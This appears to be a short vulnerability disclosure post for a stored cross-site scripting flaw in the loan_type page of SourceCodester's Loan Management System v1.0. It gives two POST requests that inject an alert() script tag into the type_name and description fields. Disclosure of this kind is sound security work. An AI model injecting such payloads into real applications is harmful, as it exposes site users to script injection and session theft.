---
layout: post
title: 
tags: [CVE, XSS]
description: "Stored Cross-Site Scripting (XSS) vulnerability in 'loan_type.php' of SourceCodesters Loan Management System v1.0."
---

## Stored Cross-Site Scripting (XSS)

Stored Cross-Site Scripting (XSS) vulnerability in 'loan_type.php' of SourceCodesters Loan Management System v1.0.

Vulnerable path : http://localhost/loan/index.php?page=loan_type

### Exploitation :

#### Manually

```
POST - http://localhost/loan/index.php?page=loan_type (type_name) - <script>alert("Liodeus")</script>
```

```
POST - http://192.168.1.56/loan/index.php?page=loan_type (description) - <script>alert("Liodeus")</script>
```

*More informations to come*